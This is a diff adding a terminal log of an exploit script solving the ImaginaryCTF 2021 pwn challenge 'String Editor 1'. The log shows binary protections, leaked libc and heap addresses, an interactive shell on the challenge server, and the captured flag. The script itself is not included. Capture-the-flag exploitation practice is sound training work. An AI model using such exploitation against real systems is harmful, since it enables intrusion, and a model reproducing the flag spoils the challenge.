@@ -1,0 +1,27 @@
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200$ python3 solve.py r
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200/string_editor_1'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal.imaginaryctf.org on port 42004: Done
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+system_addr = 0x7f7f7eadb410
+libc_base   = 0x7f7f7ea86000
+heap_leak   = 0x5637a71e02a0
+heap_base   = 0x5637a71e0000
+[*] Switching to interactive mode
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 20
+-rw-r--r-- 1 nobody nogroup    42 Jul 23 06:42 flag.txt
+-rwxr-xr-x 1 nobody nogroup 12808 Jul 23 06:42 run
+$ cat flag.txt
+ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
